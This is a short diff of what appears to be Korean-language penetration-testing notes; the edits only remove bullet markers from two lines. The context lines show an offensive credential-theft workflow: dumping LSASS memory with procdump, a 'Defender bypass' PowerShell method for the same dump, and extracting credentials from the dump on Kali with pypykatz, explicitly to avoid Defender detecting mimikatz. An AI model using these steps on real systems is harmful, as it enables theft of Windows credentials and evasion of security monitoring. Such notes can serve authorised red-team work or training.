@@ -55,7 +55,7 @@ C:\temp\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
 
 ### Defender 우회 (내장 방식, 파일 전송 불필요)
 
-- Defender가 procdump를 삭제하면 사용
+Defender가 procdump를 삭제하면 사용
 
 ```powershell
 $p = (Get-Process -Name lsass).Id
@@ -70,7 +70,7 @@ Get-Item C:\temp\lsass.dmp
 
 ## 4. 덤프에서 자격 증명 추출 (Kali)
 
-- dmp를 Kali로 가져온 뒤 실행. 타겟에서 mimikatz를 직접 돌리지 않는다 (Defender 탐지)
+dmp를 Kali로 가져온 뒤 실행. 타겟에서 mimikatz를 직접 돌리지 않는다 (Defender 탐지)
 
 ```bash
 pypykatz lsa minidump /tmp/lsass.dmp
